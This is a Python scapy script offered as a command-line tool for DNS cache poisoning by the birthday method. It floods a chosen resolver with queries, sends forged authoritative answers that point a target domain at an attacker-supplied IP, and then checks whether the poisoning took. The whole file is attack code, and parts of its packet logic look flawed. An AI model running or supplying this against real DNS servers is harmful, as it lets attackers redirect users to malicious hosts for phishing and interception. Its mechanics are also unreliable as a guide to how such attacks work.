from scapy.all import *
import argparse
import random
import threading

def dns_query(target, domain):
    dns_req = IP(dst=target)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=domain))
    return dns_req

def dns_response(target, domain, fake_ip, query_packet):
    spoof_resp = IP(dst=target, src=query_packet[IP].dst)/UDP(dport=query_packet[UDP].sport, sport=53)
    spoof_resp /= DNS(id=query_packet[DNS].id, qr=1, aa=1, qd=query_packet[DNS].qd, an=DNSRR(rrname=domain, rdata=fake_ip, ttl=60))
    return spoof_resp

def dns_birthday_attack(target, domain, fake_ip, num_queries):
    query_packet = dns_query(target, domain)
    
    query_threads = []
    for _ in range(num_queries):
        thread = threading.Thread(target=send, args=(query_packet,), kwargs={'verbose': 0})
        query_threads.append(thread)
        thread.start()
    
    for thread in query_threads:
        thread.join()
    
    query_resp = []
    for _ in range(num_queries):
        transaction_id = random.randint(0, 65535)
        query_packet[DNS].id = transaction_id
        query_resp.append(dns_response(target, domain, fake_ip, query_packet))
    
    response_threads = []
    for resp in query_resp:
        thread = threading.Thread(target=send, args=(resp,), kwargs={'verbose': 0})
        response_threads.append(thread)
        thread.start()
    
    for thread in response_threads:
        thread.join()

def test_dns_poisoning(target, domain, fake_ip):
    test_query = dns_query(target, domain)
    test_response = sr1(test_query, verbose=0, timeout=5)
    
    if test_response and DNS in test_response and test_response[DNS].an:
        if test_response[DNS].an.rdata == fake_ip:
            print(f"DNS cache poisoning attack succeeded! {domain} resolves to {fake_ip}")
        else:
            print(f"DNS cache poisoning attack failed. {domain} resolves to {test_response[DNS].an.rdata} instead of {fake_ip}")
    else:
        print(f"No DNS response received for {domain}")

# Parse command-line arguments
parser = argparse.ArgumentParser(description='DNS Cache Poisoning Attack using Birthday Paradox')
parser.add_argument('-t', '--target', required=True, help='Target DNS server IP address')
parser.add_argument('-d', '--domain', required=True, help='Target domain name')
parser.add_argument('-f', '--fake-ip', required=True, help='Fake IP address to inject')
parser.add_argument('-n', '--num-queries', type=int, default=1000, help='Number of DNS queries to send (default: 1000)')
args = parser.parse_args()

# Perform the DNS cache poisoning attack
dns_birthday_attack(args.target, args.domain, args.fake_ip, args.num_queries)
print(f"DNS cache poisoning attack completed against {args.target} for domain {args.domain} with fake IP {args.fake_ip}")

# Test if the DNS cache poisoning attack succeeded
test_dns_poisoning(args.target, args.domain, args.fake_ip)